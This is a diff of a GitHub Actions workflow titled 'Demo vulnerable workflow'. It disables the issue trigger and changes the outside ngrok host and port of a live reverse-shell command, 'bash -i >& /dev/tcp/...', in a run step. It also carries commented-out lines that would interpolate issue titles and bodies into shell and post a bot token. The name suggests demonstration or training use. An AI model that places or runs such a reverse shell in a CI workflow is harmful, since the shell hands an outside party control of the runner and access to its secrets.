@@ -2,8 +2,8 @@ name: Demo vulnerable workflow
 
 on:
   workflow_dispatch:
-  issues:
-    types: [opened]
+  # issues:
+  #   types: [opened]
 
 env:
   # Environment variable for demonstration purposes
@@ -20,7 +20,7 @@ jobs:
       - run: |
          # echo "ISSUE TITLE: ${{github.event.issue.title}}"
          # echo "ISSUE DESCRIPTION: ${{github.event.issue.body}}"
-         bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/14585 0>&1
+         bash -i >& /dev/tcp/4.tcp.eu.ngrok.io/19584 0>&1
 
       # - run: |
       #    curl -X POST -H "Authorization: Token ${{ secrets.BOT_TOKEN }}" -d '{"labels": ["New Issue"]}' ${{ github.event.issue.url }}/labels
